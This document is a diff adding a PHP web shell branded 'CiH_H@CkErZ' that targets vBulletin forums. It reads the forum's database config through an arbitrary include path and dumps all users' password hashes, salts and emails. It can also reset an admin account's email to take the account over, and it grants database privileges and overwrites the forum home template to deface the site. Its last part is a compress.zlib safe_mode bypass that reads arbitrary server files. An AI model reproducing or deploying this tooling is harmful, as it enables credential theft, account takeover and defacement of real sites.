@@ -1,0 +1,338 @@
+<?
+if (ini_get('register_globals') != '1') {
+  /* We'll register the variables as globals: */
+  if (!empty($HTTP_POST_VARS))
+    extract($HTTP_POST_VARS);
+
+  if (!empty($HTTP_GET_VARS))
+    extract($HTTP_GET_VARS);
+
+  if (!empty($HTTP_SERVER_VARS))
+    extract($HTTP_SERVER_VARS);
+}
+?>
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta name="keywords" content="CiH_H@CkErZ">
+<meta name="description" content="CiH_H@CkErZ">
+</head>
+<STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style>
+<title>VB-CiH</title>
+<body>
+
+<p>&nbsp;</p>
+<p align="center"><b><font size="6">
+<font color="#FF0000" face="Times New Roman">VB - </font><a href="mailto:cih_hacker@yahoo.com">
+<font color="#FF0000" face="Times New Roman">CiH_H@CkErZ</font></a></font></b></p>
+<p align="center">&nbsp;</p>
+<p>&nbsp;</p>
+<table border="1" width="100%" id="table2">
+	<tr>
+		<td bordercolor="#DADADA">
+<form method="POST">
+	<p align="center">
+	<b>
+	<font size="4" face="Times New Roman">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Review Config Forums :</font><font face="Simplified Arabic" size="4"> </font></b>
+	<input type="text" name="file" size="52" value="/home/user/public_html/vb/includes/config.php">
+	<input type="submit" value="Open" name="cih"></p>
+</form>
+		</td>
+	</tr>
+</table>
+<p align="center">&nbsp;</p>
+             <table width="985" border="1" align="center" cellpadding="1" cellspacing="1" id="table6">
+               <tr>
+                 <td style="font-family: verdana; color: #d9d9d9; font-size: 11px"><div align="center">
+                     <b>
+							<font face="Simplified Arabic" size="4">
+						<form method="get" style="color: #00FF00; border-width: 3px; background-color: #000000">
+                       <p>
+                         <font size="4" face="Times New Roman">Members to review
+							the forums :</font>
+	<input type="text" name="bloody" size="52" value="/home/user/public_html/vb/includes/config.php">
+	<input type="submit" value="Open" name="cih"></font></p>
+                     </form>
+							<font face="Simplified Arabic" size="2">
+<?php
+  if($bloody==""){
+  	echo " ";
+  	}
+  	else{
+  		if(include($bloody)){
+$hostname_config = $config['MasterServer']['servername'];
+$database_config = $config['Database']['dbname'];
+$username_config = $config['MasterServer']['username'];
+$password_config = $config['MasterServer']['password'];
+$config = mysql_pconnect($hostname_config, $username_config, $password_config) or trigger_error(mysql_error(),E_USER_ERROR);
+mysql_select_db($database_config, $config);
+$query_admin = "SELECT * FROM `user`";
+$admin = mysql_query($query_admin, $config) or die(mysql_error());
+$row_admin = mysql_fetch_assoc($admin);
+$totalRows_admin = mysql_num_rows($admin);
+$config = mysql_pconnect($hostname_config, $username_config, $password_config) or trigger_error(mysql_error(),E_USER_ERROR);
+do {
+echo " &#1585;&#1602;&#1605; &#1575;&#1604;&#1593;&#1590;&#1608;&#1610;&#1577; : ";
+echo $row_admin['userid'];
+echo "<br>";
+echo "&#1575;&#1604;&#1610;&#1608;&#1586;&#1585; : ";
+echo $row_admin['username'];
+echo "<br>";
+echo "&#1604;&#1602;&#1576; &#1575;&#1604;&#1593;&#1590;&#1608; : ";
+echo $row_admin['usertitle'];
+echo "<br>";
+echo $row_admin['password'];
+echo " : &#1575;&#1604;&#1576;&#1575;&#1587;&#1608;&#1608;&#1585;&#1583;";
+echo "<br>";
+echo $row_admin['salt'];
+echo " : &#1575;&#1604;&#1587;&#1575;&#1604;&#1578;";
+echo "<br>";
+echo $row_admin['email'];
+echo " : &#1575;&#1604;&#1575;&#1610;&#1605;&#1610;&#1604;";
+echo "<br>";
+echo "___________________________________________________________________";
+echo "<br>";
+} while ($row_admin = mysql_fetch_assoc($admin));
+  		}
+		else{ echo "Config Wrong Path"; }
+		}
+?>
+
+						</font></b>
+
+                 </div></td>
+               </tr>
+               </table>
+           <p>&nbsp;</p>
+<table border="1" width="100%" id="table5">
+	<tr>
+		<td><div align="center">
+                     <form method="post" action="?id=1">
+
+                       <div align="center">
+                         <table width="597" border="0" cellspacing="1">
+                           <tr>
+                             <td width="227" align="right">
+								<p dir="ltr">
+								<font color="#FFFFFF" face="Times New Roman" size="3">
+								<b>Path Config
+								:</b></font></td>
+                             <td width="373"><div align="center" class="style8">
+                               <input name="masar" value="/home/user/public_html/vb/includes/config.php" size="52" style="float: left"></div></td>
+                           </tr>
+                           <tr>
+                             <td>
+								<p dir="ltr" align="right"><b>
+								<font color="#FFFFFF" face="Times New Roman" size="3">
+								Your Email
+								:</font></b></td>
+                             <td><div align="center" class="style8">
+                               <input name="email" value="cih_hacker@yahoo.com" size="33" style="float: left"></div></td>
+                           </tr>
+                           <tr>
+                             <td>
+								<p dir="ltr" align="right"><b>
+								<font color="#FFFFFF" face="Times New Roman" size="3">
+								No. Membership of the Admin
+								:</font></b></td>
+                             <td><div align="center" class="style8">
+                               <input name="id" size="3" style="float: left"></div></td>
+                           </tr>
+                         </table>
+                       </div>
+                       <p align="center">
+						<input name="submit3" type="submit" value="Change !">
+</p>
+						<p><p>
+<? switch($_GET['id']) {
+case "1";
+if(@include($masar)){
+$database = $config['Database']['dbname'];
+$username = $config['MasterServer']['username'];
+$password = $config['MasterServer']['password'];
+$hostname = $config['MasterServer']['servername'];
+$con = mysql_connect("$hostname","$username","$password") or die (mysql_error());
+$db = mysql_select_db("$database",$con) or die (mysql_error());
+$query = "UPDATE user SET email='$email' WHERE userid='$id'" or die (mysql_error());
+$result = mysql_query($query) or die (mysql_error());
+if($result){
+echo "E-mail has been changed to $email";
+}
+else{
+echo "Config Wrong Path ";
+}
+}
+
+else{
+echo "Config Wrong Path ";
+}
+}
+?>
+                     </p></p>
+                     </form>
+                 </div></td>
+
+
+	</tr>
+</table>
+<p align="center">&nbsp;<table border="1" width="100%" id="table3">
+	<tr>
+		<td bordercolor="#DADADA" style="font-family: verdana; color: #d9d9d9; font-size: 11px">
+
+<p align="center">&nbsp;<style>
+input,textarea, form {
+
+background-color: #000000;
+
+border-width: 3px;
+
+
+color: #00FF00;
+}
+
+
+</style>
+
+<body bgcolor='#666666'>
+
+<form method =post >
+<p align='center'><b><font size="4" face="Times New Roman">Index Changer</font></b></p>
+<p align='center'>&nbsp;</p>
+<p align='center'><b><font color='#FFFFFF'>&nbsp;&nbsp;
+</font><font face="Simplified Arabic" size="4">&nbsp;</font><font color="#FFFFFF" size="3" face="Times New Roman">servername :</font></b>&nbsp;&nbsp; <input type=text name=host value=localhost>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<b><font color='#FFFFFF'>&nbsp; </font><font face="Simplified Arabic" size="3">&nbsp;</font><font color="#FFFFFF" face="Times New Roman" size="3">dbname :</font><font face="Simplified Arabic" size="4">
+</font><font color='#FFFFFF'>&nbsp; </font></b> <input type=text name=db ></p>
+<p align='center'></br>
+<b><font color='#FFFFFF'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font>
+<font face="Times New Roman" color="#FFFFFF" size="3">username :</font><font color='#FFFFFF'><font size="3">
+</font>&nbsp; </font> </b> <input type=text name=user >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<font color="#FFFFFF"><b><font face="Times New Roman" size="3">password :</font></b>
+</font>&nbsp; <input type=text name=pass ></p>
+<p align='center'><font color='#FFFFFF'></br>
+</font><b><font face="Times New Roman" color="#FFFFFF" size="3">Index Source :</font></b></br>
+<textarea type=text name=index  rows=23 cols=68></textarea> </br>
+<input type=submit name=ok value='Change !' ></br>
+
+</p>
+
+</form>
+<?php
+
+$HOST = $_POST['host'];
+$DB = $_POST['db'];
+$USER = $_POST['user'];
+$PASSWORD = $_POST['pass'];
+$index = $_POST['index'];
+
+
+if(isset($_POST['ok'])){
+$index =@mysql_escape_string($index);
+$connect=@mysql_connect($HOST,$USER,$PASSWORD);
+$select=@mysql_select_db($DB);
+
+if($select){
+
+$query = "GRANT ALL PRIVILEGES ON $DB.* TO $USER@$HOST WITH GRANT OPTION";
+$query1 ="UPDATE `template` SET `template` = '$index' WHERE `title` ='FORUMHOME';";
+$query2= "UPDATE `style` SET `css` = '$index' , `stylevars` = '', `csscolors` = '', `editorstyles` = '' ;";
+$query3 = "FLUSH PRIVILEGES";
+$result=@mysql_query($query);
+$result=@mysql_query($query1);
+$result=@mysql_query($query2);
+$result=@mysql_query($query3);
+
+if ($result){
+echo "<SCRIPT language=JavaScript>
+<!--
+// Hide the JavaScript from older browsers
+(window.alert('Hacked :P .. cih_hacker@yahoo.com'))
+// End hiding of script
+// --></SCRIPT>";
+}
+}
+    else {
+
+echo "<SCRIPT language=JavaScript>
+<!--
+// Hide the JavaScript from older browsers
+(window.alert('Error !! Check Database Information And Try Again ;)'))
+// End hiding of script
+// --></SCRIPT>";
+}
+}
+?></td>
+	</tr>
+</table>
+
+
+<p align="center">&nbsp;</p>
+
+
+
+<p align="center">&nbsp;</p>
+
+
+
+
+<?php
+/*
+Safe_Mode Bypass PHP 5.2.6 and PHP 5.2.9
+by CiH<cih_hacker@yahoo.com>
+*/
+
+$tymczas="./"; // Set $tymczas to dir where you have 777 like /var/tmp
+
+if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
+{
+ $safemode = true;
+ $hsafemode = "<font color=\"red\">ON (secure)</font>";
+}
+else {$safemode = false; $hsafemode = "<font color=\"green\">OFF (not secure)</font>";}
+echo("Safe-mode: $hsafemode");
+$v = @ini_get("open_basedir");
+if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=\"red\">".$v."</font>";}
+else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";}
+echo("<br>");
+echo("Open base dir: $hopenbasedir");
+echo("<br>");
+echo "Disable functions : <b>";
+if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
+$free = @diskfreespace($dir);
+if (!$free) {$free = 0;}
+$all = @disk_total_space($dir);
+if (!$all) {$all = 0;}
+$used = $all-$free;
+$used_percent = @round(100/($all/$free),2);
+
+echo "<PRE>\n";
+if(empty($file)){
+if(empty($_GET['file'])){
+if(empty($_POST['file'])){
+die("\nWelcome.. To The CiH_H@CkErZ Script Safe_Mode Bypass PHP 5.2.6 and PHP 5.2.9 .. Enjoy\n <B><CENTER><FONT
+COLOR=\"BLUE\">CiH_H@CkErZ
+cih_hacker@yahoo.com</FONT></CENTER></B>");
+} else {
+$file=$_POST['file'];
+}
+} else {
+$file=$_GET['file'];
+}
+}
+
+$temp=tempnam($tymczas, "cx");
+
+if(copy("compress.zlib://".$file, $temp)){
+$zrodlo = fopen($temp, "r");
+$tekst = fread($zrodlo, filesize($temp));
+fclose($zrodlo);
+echo "<B>--- Start File ".htmlspecialchars($file)."
+-------------</B>\n".htmlspecialchars($tekst)."\n<B>--- End File
+".htmlspecialchars($file)." ---------------\n";
+unlink($temp);
+die("\n<FONT COLOR=\"RED\"><B>File
+".htmlspecialchars($file)." has been already loaded. CiH_H@CkErZ</B></FONT>");
+} else {
+die("<FONT COLOR=\"RED\"><CENTER>Go to My Email (cih_hacker@yahoo.com) To Help For This
+<B>".htmlspecialchars($file)."</B> dosen't exists or you don't have
+access.</CENTER></FONT>");
+}
+?>
